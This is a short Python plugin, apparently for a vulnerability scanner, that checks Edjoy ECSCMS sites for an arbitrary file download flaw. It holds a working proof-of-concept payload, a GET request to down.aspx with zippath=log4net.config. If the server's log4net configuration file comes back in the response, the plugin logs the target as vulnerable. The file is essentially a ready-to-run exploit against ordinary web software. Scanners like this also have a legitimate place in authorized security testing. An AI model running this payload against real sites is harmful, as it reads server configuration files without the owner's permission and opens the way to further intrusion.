#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

from module.plugin import Plugin

class poc(Plugin):

    type = 'CMS'
    cmsname = 'edjoy'
    querytype = 'site'
    description = 'Edjoy ECSCMS down.aspx download file'
    
    def __init__(self):
    
        self.payload = "/down.aspx?filename=test&zippath=log4net.config"
    
    def exploit(self, target):
       
        response = self.query(method='GET', url=target+self.payload)
        if response:
            if response.ok:
                if '<log4net>' in response.content and '<?xml version="1.0" encoding="utf-8" ?>' in response.content:
                    self.log.vuln(target)
